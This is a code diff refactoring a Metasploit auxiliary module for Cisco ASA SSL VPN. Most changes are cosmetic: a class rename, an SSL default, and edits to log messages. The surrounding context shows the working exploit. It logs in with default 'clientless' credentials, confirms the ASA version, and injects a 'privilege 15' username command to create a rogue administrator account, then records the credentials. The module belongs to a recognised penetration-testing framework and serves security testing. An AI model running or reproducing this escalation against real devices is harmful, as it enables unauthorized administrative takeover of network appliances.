@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -21,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
       'Author'       =>
         [
           'jclaudius <jclaudius[at]trustwave.com>',
-          'lguay <laura.r.guay[at]gmail.com'
+          'lguay <laura.r.guay[at]gmail.com>'
         ],
       'License'     => MSF_LICENSE,
       'References'  =>
@@ -30,13 +28,13 @@ class Metasploit3 < Msf::Auxiliary
           ['URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
           ['URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt']
         ],
-      'DisclosureDate' => 'Apr 09 2014'
+      'DisclosureDate' => 'Apr 09 2014',
+      'DefaultOptions' => { 'SSL' => true }
     ))
 
     register_options(
       [
         Opt::RPORT(443),
-        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
         OptString.new('USERNAME', [true, "A specific username to authenticate as", 'clientless']),
         OptString.new('PASSWORD', [true, "A specific password to authenticate with", 'clientless']),
         OptString.new('GROUP', [true, "A specific VPN group to use", 'clientless']),
@@ -53,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
               'method' => 'GET'
             )
 
-      vprint_good("#{peer} - Server is responsive")
+      vprint_good("Server is responsive")
     rescue ::Rex::ConnectionError, ::Errno::EPIPE
       return false
     end
@@ -91,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 
     if res &&
        res.code == 200
-      vprint_good("#{peer} - Logged out")
+      vprint_good("Logged out")
     end
   end
 
@@ -117,8 +115,8 @@ class Metasploit3 < Msf::Auxiliary
          resp.body.include?('Cisco Adaptive Security Appliance Software Version')
         return resp.body
       else
-        vprint_error("#{peer} - Unable to run '#{command}'")
-        vprint_good("#{peer} - Retrying #{i} '#{command}'") unless i == 2
+        vprint_error("Unable to run '#{command}'")
+        vprint_good("Retrying #{i} '#{command}'") unless i == 2
       end
     end
 
@@ -130,18 +128,18 @@ class Metasploit3 < Msf::Auxiliary
     password = Rex::Text.rand_text_alphanumeric(20)
 
     tries.times do |i|
-      vprint_good("#{peer} - Attemping to add User: #{username}, Pass: #{password}")
+      vprint_good("Attemping to add User: #{username}, Pass: #{password}")
       command = "username #{username} password #{password} privilege 15"
       resp = run_command(command, cookie)
 
       if resp &&
          !resp.body.include?('Command authorization failed') &&
          !resp.body.include?('Command failed')
-        vprint_good("#{peer} - Privilege Escalation Appeared Successful")
+        vprint_good("Privilege Escalation Appeared Successful")
         return [username, password]
       else
-        vprint_error("#{peer} - Unable to run '#{command}'")
-        vprint_good("#{peer} - Retrying #{i} '#{command}'") unless i == tries - 1
+        vprint_error("Unable to run '#{command}'")
+        vprint_good("Retrying #{i} '#{command}'") unless i == tries - 1
       end
     end
 
@@ -181,7 +179,7 @@ class Metasploit3 < Msf::Auxiliary
          resp.body.include?('SSL VPN Service') &&
          resp.body.include?('webvpn_logout')
 
-        vprint_good("#{peer} - Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}")
+        vprint_good("Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}")
         return resp.get_cookies
       else
         return false
@@ -195,7 +193,7 @@ class Metasploit3 < Msf::Auxiliary
   def run_host(ip)
     # Validate we're dealing with Cisco SSL VPN
     unless validate_cisco_ssl_vpn
-      vprint_error("#{peer} - Does not appear to be Cisco SSL VPN")
+      vprint_error("Does not appear to be Cisco SSL VPN")
       return
     end
 
@@ -203,7 +201,7 @@ class Metasploit3 < Msf::Auxiliary
     # interimittent based on session, so we'll just retry
     # 'X' times.
     datastore['RETRIES'].times do |i|
-      vprint_good("#{peer} - Exploit Attempt ##{i}")
+      vprint_good("Exploit Attempt ##{i}")
 
       # Authenticate to SSL VPN and get session cookie
       cookie = do_login(
@@ -214,7 +212,7 @@ class Metasploit3 < Msf::Auxiliary
 
       # See if our authentication attempt failed
       unless cookie
-        vprint_error("#{peer} - Failed to login to Cisco SSL VPN")
+        vprint_error("Failed to login to Cisco SSL VPN")
         next
       end
 
@@ -223,10 +221,10 @@ class Metasploit3 < Msf::Auxiliary
 
       if version &&
          version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\d+\.\(\)]+)/)
-        print_good("#{peer} - Show version succeeded. Version is Cisco ASA #{version_match[1]}")
+        print_good("Show version succeeded. Version is Cisco ASA #{version_match[1]}")
       else
         do_logout(cookie)
-        vprint_error("#{peer} - Show version failed")
+        vprint_error("Show version failed")
         next
       end
 
@@ -235,11 +233,11 @@ class Metasploit3 < Msf::Auxiliary
       do_logout(cookie)
 
       if creds
-        print_good("#{peer} - Successfully added level 15 account #{creds.join(", ")}")
+        print_good("Successfully added level 15 account #{creds.join(", ")}")
         user, pass = creds
         report_escalated_creds(user, pass)
       else
-        vprint_error("#{peer} - Failed to created user account on Cisco SSL VPN")
+        vprint_error("Failed to created user account on Cisco SSL VPN")
       end
     end
   end
@@ -274,5 +272,4 @@ class Metasploit3 < Msf::Auxiliary
     login_data.merge!(service_data)
     create_credential_login(login_data)
   end
-
 end
